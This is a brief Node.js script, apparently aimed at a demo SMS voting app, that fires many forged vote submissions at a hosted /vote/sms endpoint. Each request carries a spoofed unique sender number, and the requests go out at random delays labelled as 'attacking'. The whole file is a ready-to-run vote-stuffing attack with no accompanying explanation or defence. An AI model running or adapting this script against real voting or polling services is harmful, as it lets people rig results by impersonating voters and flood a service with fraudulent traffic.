var request = require('request'),
    querystring = require('querystring'),
    Buffer = require('buffer').Buffer;

var number = process.argv[2]
  , vote = process.argv[3]
  , iterations = parseInt(process.argv[4]);

var attack = function(i) {
  var dataHash = {Body: vote, From: vote + "-" + i, To: number},
      body = querystring.stringify(dataHash),
      headers = {'Content-Type': 'application/x-www-form-urlencoded'};

  request.post({uri: 'http://votr-part3.jit.su/vote/sms', headers: headers, body: body},
    function (err, response, body) {
      if (err) {
         console.log("ERROR: ", err);
      }
      else {
         console.log(body);
      }
    }
  );
};

for (var i=1; i <= iterations; i++) {
  var sleep = Math.floor((Math.random()*1000*60)+1);
  console.log("Attacking in ", sleep, " milliseconds");
  setTimeout(attack, sleep, i);
}
